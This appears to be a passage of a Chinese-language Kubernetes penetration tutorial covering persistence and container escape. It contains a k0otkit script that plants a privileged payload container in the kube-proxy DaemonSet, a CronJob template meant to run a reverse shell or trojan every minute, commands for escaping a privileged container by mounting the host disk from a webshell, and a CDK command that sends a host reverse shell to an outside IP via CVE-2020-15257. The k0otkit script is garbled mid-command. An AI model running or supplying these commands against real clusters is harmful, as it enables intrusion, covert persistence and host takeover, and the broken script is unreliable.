# 监听
./handle_multi_reverse_shell.sh
    k0otkit.sh的内容复制到master执行：
    ```css
    volume_name=cache
    mount_path=/var/kube-proxy-cache
    ctr_name=kube-proxy-cache
    binary_file=/usr/local/bin/kube-proxy-cache
    payload_name=cache
    secret_name=proxy-cache
    secret_data_name=content
    ctr_line_num=$(kubectl --kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml | awk '/ containers:/{print NR}')
    volume_line_num=$(kubectl --kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml | awk '/ volumes:/{print NR}')
    image=$(kubectl --kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml | grep " image:" | awk '{print $2}')
    # create payload secret
    cat &=).\$fd); select((select(\$FH), \$|=1)[0]); print \$FH pack q/H*/, ; my \$pid = fork(); if (0 != \$pid) { wait }; if (0 == \$pid){system(qq(/proc/\$\$\$\$/fd/\$fd))}'\"]\n        env:\n          - name: $payload_name\n            valueFrom:\n              secretKeyRef:\n                name: $secret_name\n                key: $secret_data_name\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: $mount_path\n          name: $volume_name" \
      | kubectl --kubeconfig /root/.kube/config replace -f -
### cronjob持久化
CronJob 用于执行周期性的动作，例如备份、报告生成等，攻击者可以利用此功能持久化。
    apiVersion: batch/v1
    kind: CronJob       #使用CronJob对象
    metadata:
      name: hello
    spec:
      schedule: "*/1 * * * *"   #每分钟执行一次
      jobTemplate:
        spec:
          template:
            spec:
              containers:
              - name: hello
                image: busybox
                imagePullPolicy: IfNotPresent
                command:
                - /bin/sh
                - -c
                - #反弹Shell或者木马  
              restartPolicy: OnFailure
## 权限提升
  * 特权容器逃逸
  * Docker漏洞
  * Linux Capabilities逃逸  
### 特权容器逃逸  
当容器启动加上--privileged选项时，容器可以访问宿主机上所有设备。  
而K8s配置文件启用了privileged: true:  
```css  
spec:  
containers:
  * name: ubuntu  
image: ubuntu:latest  
securityContext:  
privileged: true
        实战案例：
    通过漏洞获取WebShell，查看根目录存在.dockerenv，可通过fdisk -l查看磁盘目录，进行挂载目录逃逸:
    ```css
    #Webshell下操作
    fdisk -l
    mkdir /tmp/test
    mount /dev/sda3 /tmp/test
    chroot /tmp/test bash
### Docker漏洞  
这里介绍两个知名的docker逃逸漏洞。  
#### CVE-2020-15257  
在Containerd 1.3.9版本之前和1.4.0~1.4.2版本，使用了--host网络模式，会造成containerd-shim
API暴露，通过调用API功能实现逃逸。  
Host模式特点：
  * 共享宿主机网络
  * 网络性能无损耗
  * 各容器网络无隔离
  * 网络资源无法分别统计
  * 端口管理困难
  * 不支持端口映射
        #判断是否使用host模式
    cat /proc/net/unix | grep 'containerd-shim'
        #反弹宿主机的shell到远端服务器
    ./cdk_linux_386 run shim-pwn reverse 192.168.238.159 4455
#### CVE-2019-5736  
当runc动态编译时，会从容器镜像中载入动态链接库，导致加载恶意动态库；当打开/prco/self/exe即runc时，会执行恶意动态链接库中的恶意程序，由于恶意程序继承runc打开的文件句柄，可以通过该文件句柄替换host上的runc。  
此后，再次执行runc相关的命令，则会产生逃逸。
版本漏洞：  
docker version 
2.Threat matrix for Kubernetes  
3.Kubernetes Attack Surface  
4.Attack methods and defenses on Kubernetes  
5.k0otkit  
6.CVE-2019-5736-Poc  
7.修复Docker操作系统命令注入漏洞公告（CVE-2019-5736）  